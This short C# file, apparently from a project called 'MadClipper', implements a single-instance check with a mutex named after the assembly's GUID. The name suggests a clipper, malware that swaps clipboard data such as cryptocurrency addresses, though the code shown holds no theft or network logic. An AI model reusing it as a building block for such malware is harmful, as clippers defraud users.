using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace MadClipper
{
    internal static class MutEx
    {
        public static Mutex InCheckMutex;


        public static bool Check()
        {
            InCheckMutex = new Mutex(true, ((GuidAttribute)Assembly.GetExecutingAssembly().GetCustomAttributes(typeof(GuidAttribute), false).GetValue(0)).Value.ToString(), out bool isOK); //Мутекс 
            return isOK;
        }
    }
}
